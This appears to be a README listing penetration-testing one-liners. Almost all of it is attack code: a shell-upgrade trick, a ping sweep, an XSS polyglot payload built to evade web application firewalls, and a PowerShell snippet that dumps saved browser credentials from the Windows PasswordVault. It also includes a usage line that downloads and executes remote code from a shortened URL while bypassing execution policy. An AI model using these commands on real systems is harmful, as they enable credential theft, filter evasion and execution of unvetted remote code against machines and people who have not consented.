# oneliners
Collection of handy one line things 

### ye olde pty 
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
### look no nmap
```
for i in `seq 1 255`; do ping -c 1 10.10.10.$i | tr \\n ' ' | awk '/1 received/ {print $2}'; done
```

### Upload not one line
```
cat archive.tar.gz | base64
cat <<EOF | base64 -d > archive.tar.gz
///// paste here the base64 encoded file
EOF
```
## pentest 

### anti-waf
```
javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
```
### blocked ports 
```
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
```
### run powershell = one line, extract passwords from windows browsers = three lines
# Content: Extract stored credentials from Internet Explorer and Edge
# Author: Florian Hansemann | @HanseSecure | https://hansesecure.de
# Date: 04/2018
# Usage: powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/2K75g15’)"

[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | % { $_.RetrievePassword();$_ }
